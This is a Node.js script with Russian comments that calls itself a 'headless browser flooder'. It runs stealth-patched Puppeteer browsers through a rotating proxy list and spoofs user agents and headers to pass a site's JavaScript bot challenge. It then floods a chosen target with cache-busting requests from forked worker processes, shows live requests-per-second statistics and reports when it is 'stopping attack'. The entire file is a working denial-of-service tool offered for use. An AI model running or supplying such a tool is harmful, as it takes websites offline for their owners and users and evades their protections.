const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { executablePath } = require('puppeteer');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');

puppeteer.use(StealthPlugin());

// ============================================
// УТИЛИТЫ ИЗ ОРИГИНАЛЬНОГО СКРИПТА
// ============================================
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
}

function randomIntn(min, max) {
    return min + ((Math.random() * (max - min + 1)) | 0);
}

function randomElement(arr) {
    return arr[(Math.random() * arr.length) | 0];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// ============================================
// КОНФИГУРАЦИЯ
// ============================================
if (process.argv.length < 4) {
    console.log('\n❌ Использование: node script.js <target> <proxy-file> [threads] [requests-per-browser] [delay-ms] [time-sec]');
    console.log('📝 Пример: node script.js https://example.com proxies.txt 4 50 100 60');
    console.log('\n📋 Формат прокси:');
    console.log('   HTTP:    http://host:port');
    console.log('   SOCKS5:  socks5://host:port\n');
    process.exit(1);
}

const config = {
    target: process.argv[2],
    proxyFile: process.argv[3],
    threads: parseInt(process.argv[4]) || os.cpus().length,
    requestsPerBrowser: parseInt(process.argv[5]) || 50,
    delay: parseInt(process.argv[6]) || 100,
    time: parseInt(process.argv[7]) || 60,
    pathFlag: process.argv.includes('--path')
};

let proxies = [];
try {
    proxies = readLines(config.proxyFile);
    if (proxies.length === 0) {
        console.log('❌ Proxy file is empty!');
        process.exit(1);
    }
} catch (error) {
    console.log(`❌ Error reading proxy file: ${error.message}`);
    process.exit(1);
}

// User agents из оригинального скрипта
const useragents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/22B91 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
];

const languages = ["en-US", "en-GB", "en", "de", "fr", "es", "pt-BR", "it", "ru", "ja", "nl", "pl", "ko", "tr", "sv"];

// ============================================
// СТАТИСТИКА (SHARED МЕЖДУ ПРОЦЕССАМИ)
// ============================================
class Stats {
    constructor() {
        this.totalRequests = 0;
        this.successRequests = 0;
        this.failedRequests = 0;
        this.blockedRequests = 0;
        this.proxyErrors = 0;
        this.startTime = Date.now();
        this.lastDisplayTime = Date.now();
        this.requestsLastSecond = 0;
    }

    increment(type) {
        this.totalRequests++;
        if (type === 'success') this.successRequests++;
        else if (type === 'failed') this.failedRequests++;
        else if (type === 'blocked') this.blockedRequests++;
        else if (type === 'proxy_error') this.proxyErrors++;
        this.requestsLastSecond++;
    }

    getElapsedTime() {
        return ((Date.now() - this.startTime) / 1000).toFixed(1);
    }

    getRPS() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        return elapsed > 0 ? (this.totalRequests / elapsed).toFixed(2) : 0;
    }

    display() {
        const now = Date.now();
        if (now - this.lastDisplayTime >= 1000) {
            const elapsed = this.getElapsedTime();
            const rps = this.getRPS();
            const currentRPS = this.requestsLastSecond;
            
            console.clear();
            console.log('\n╔═══════════════════════════════════════════════════════════════╗');
            console.log('║      🚀 HEADLESS BROWSER FLOODER + PROXY - LIVE STATS        ║');
            console.log('╠═══════════════════════════════════════════════════════════════╣');
            console.log(`║ 🎯 Target:      ${config.target.substring(0, 43).padEnd(43)} ║`);
            console.log(`║ 🌐 Proxies:     ${proxies.length.toString().padEnd(43)} ║`);
            console.log(`║ ⏱️  Runtime:     ${elapsed}s / ${config.time}s`.padEnd(64) + '║');
            console.log('╠═══════════════════════════════════════════════════════════════╣');
            console.log(`║ 📊 Total:       ${this.totalRequests.toLocaleString().padEnd(43)} ║`);
            console.log(`║ ✅ Success:     ${this.successRequests.toLocaleString().padEnd(43)} ║`);
            console.log(`║ ❌ Failed:      ${this.failedRequests.toLocaleString().padEnd(43)} ║`);
            console.log(`║ 🛡️  Blocked:     ${this.blockedRequests.toLocaleString().padEnd(43)} ║`);
            console.log(`║ 🔌 Proxy Err:   ${this.proxyErrors.toLocaleString().padEnd(43)} ║`);
            console.log('╠═══════════════════════════════════════════════════════════════╣');
            console.log(`║ 🔥 Current RPS: ${currentRPS.toString().padEnd(43)} ║`);
            console.log(`║ 📈 Average RPS: ${rps.padEnd(43)} ║`);
            console.log('╚═══════════════════════════════════════════════════════════════╝\n');
            
            const progress = Math.min((parseFloat(elapsed) / config.time) * 100, 100);
            const filled = Math.floor(progress / 2);
            const empty = 50 - filled;
            const progressBar = '█'.repeat(filled) + '░'.repeat(empty);
            console.log(`Progress: [${progressBar}] ${progress.toFixed(1)}%\n`);
            
            this.requestsLastSecond = 0;
            this.lastDisplayTime = now;
        }
    }
}

const stats = new Stats();

// ============================================
// ГЕНЕРАЦИЯ URL С CACHE BYPASS
// ============================================
function generateUrl() {
    const parsedTarget = new URL(config.target);
    let path = parsedTarget.pathname || '/';
    
    if (config.pathFlag) {
        const randQuery = `?${randomString(12)}=${randomIntn(100000, 999999)}`;
        path = path + randQuery;
    } else {
        const randQuery = `?_cb=${Date.now()}_${randomString(8)}`;
        path = path + (path.includes('?') ? '&' : '') + randQuery.substring(1);
    }
    
    return `${parsedTarget.protocol}//${parsedTarget.host}${path}`;
}

// ============================================
// BROWSER С ПРОКСИ
// ============================================
async function createBrowser(proxyUrl) {
    const launchOptions = {
        headless: 'new',
        executablePath: executablePath(),
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--disable-gpu',
            '--window-size=1920x1080',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-blink-features=AutomationControlled'
        ],
        ignoreHTTPSErrors: true
    };
    
    // Добавляем прокси в аргументы
    if (proxyUrl) {
        launchOptions.args.push(`--proxy-server=${proxyUrl}`);
    }
    
    const browser = await puppeteer.launch(launchOptions);
    return browser;
}

// ============================================
// REQUEST FLOODER С ПРОКСИ
// ============================================
async function floodWithBrowser(browserId) {
    let browser;
    const proxyUrl = randomElement(proxies);
    
    try {
        console.log(`🌐 Browser ${browserId}: Connecting via ${proxyUrl}...`);
        browser = await createBrowser(proxyUrl);
        const page = await browser.newPage();
        
        // Случайный user agent и viewport
        const userAgent = randomElement(useragents);
        await page.setUserAgent(userAgent);
        await page.setViewport({ 
            width: randomIntn(1366, 1920), 
            height: randomIntn(768, 1080) 
        });
        
        // Заголовки
        await page.setExtraHTTPHeaders({
            'Accept-Language': randomElement(languages),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        });
        
        // Первый запрос для прохождения JS challenge
        console.log(`🔓 Browser ${browserId}: Solving JS challenge...`);
        
        try {
            const initialResponse = await page.goto(config.target, {
                waitUntil: 'networkidle2',
                timeout: 30000
            });
            
            const statusCode = initialResponse.status();
            
            if (statusCode === 403) {
                console.log(`🛡️  Browser ${browserId}: Blocked by protection (403)`);
                stats.increment('blocked');
                await browser.close();
                return;
            }
            
            if (statusCode >= 200 && statusCode < 400) {
                console.log(`✅ Browser ${browserId}: Challenge passed! Starting flood...`);
                stats.increment('success');
                
                // Множественные запросы с полученными cookies
                for (let i = 0; i < config.requestsPerBrowser; i++) {
                    if (Date.now() - stats.startTime >= config.time * 1000) {
                        break;
                    }
                    
                    try {
                        const targetUrl = generateUrl();
                        const response = await page.goto(targetUrl, {
                            waitUntil: 'domcontentloaded',
                            timeout: 10000
                        });
                        
                        const status = response.status();
                        
                        if (status >= 200 && status < 400) {
                            stats.increment('success');
                        } else if (status === 403) {
                            stats.increment('blocked');
                        } else {
                            stats.increment('failed');
                        }
                        
                        stats.display();
                        
                        if (config.delay > 0) {
                            await new Promise(resolve => setTimeout(resolve, config.delay));
                        }
                        
                    } catch (error) {
                        if (error.message.includes('net::ERR_PROXY') || error.message.includes('net::ERR_TUNNEL')) {
                            stats.increment('proxy_error');
                        } else {
                            stats.increment('failed');
                        }
                    }
                }
            } else {
                stats.increment('failed');
            }
            
        } catch (error) {
            if (error.message.includes('net::ERR_PROXY') || error.message.includes('net::ERR_TUNNEL')) {
                console.log(`🔌 Browser ${browserId}: Proxy connection failed`);
                stats.increment('proxy_error');
            } else {
                stats.increment('failed');
            }
        }
        
    } catch (error) {
        console.error(`❌ Browser ${browserId} error: ${error.message}`);
        if (error.message.includes('net::ERR_PROXY') || error.message.includes('net::ERR_TUNNEL')) {
            stats.increment('proxy_error');
        } else {
            stats.increment('failed');
        }
    } finally {
        if (browser) {
            await browser.close();
        }
    }
}

// ============================================
// CLUSTER MANAGEMENT
// ============================================
if (cluster.isMaster) {
    console.clear();
    console.log('\n╔═══════════════════════════════════════════════════════════════╗');
    console.log('║    🚀 HEADLESS BROWSER FLOODER + PROXY - INITIALIZING...     ║');
    console.log('╚═══════════════════════════════════════════════════════════════╝\n');
    console.log(`📋 Configuration:`);
    console.log(`   Target:            ${config.target}`);
    console.log(`   Proxy File:        ${config.proxyFile}`);
    console.log(`   Proxies Loaded:    ${proxies.length}`);
    console.log(`   Threads:           ${config.threads}`);
    console.log(`   Requests/Browser:  ${config.requestsPerBrowser}`);
    console.log(`   Delay:             ${config.delay}ms`);
    console.log(`   Duration:          ${config.time}s`);
    console.log(`   Cache Bypass:      ${config.pathFlag ? 'Path Mode' : 'Query Mode'}`);
    console.log(`\n🔄 Starting ${config.threads} worker threads...\n`);
    
    for (let i = 0; i < config.threads; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker, code, signal) => {
        console.log(`⚠️  Worker ${worker.process.pid} died. Restarting...`);
        if (Date.now() - stats.startTime < config.time * 1000) {
            cluster.fork();
        }
    });
    
    setTimeout(() => {
        console.log('\n\n╔═══════════════════════════════════════════════════════════════╗');
        console.log('║                    ⏹️  STOPPING ATTACK...                     ║');
        console.log('╚═══════════════════════════════════════════════════════════════╝\n');
        
        console.log('📊 Final Statistics:');
        console.log(`   Total Requests:    ${stats.totalRequests.toLocaleString()}`);
        console.log(`   Successful:        ${stats.successRequests.toLocaleString()}`);
        console.log(`   Failed:            ${stats.failedRequests.toLocaleString()}`);
        console.log(`   Blocked:           ${stats.blockedRequests.toLocaleString()}`);
        console.log(`   Proxy Errors:      ${stats.proxyErrors.toLocaleString()}`);
        console.log(`   Success Rate:      ${((stats.successRequests / stats.totalRequests) * 100).toFixed(2)}%`);
        console.log(`   Average RPS:       ${stats.getRPS()}`);
        console.log(`   Runtime:           ${stats.getElapsedTime()}s\n`);
        
        process.exit(0);
    }, config.time * 1000);
    
} else {
    (async () => {
        const workerId = cluster.worker.id;
        
        while (Date.now() - stats.startTime < config.time * 1000) {
            await floodWithBrowser(workerId);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    })();
}

process.on('uncaughtException', (error) => {
    // Игнорируем ошибки, чтобы не падал процесс
});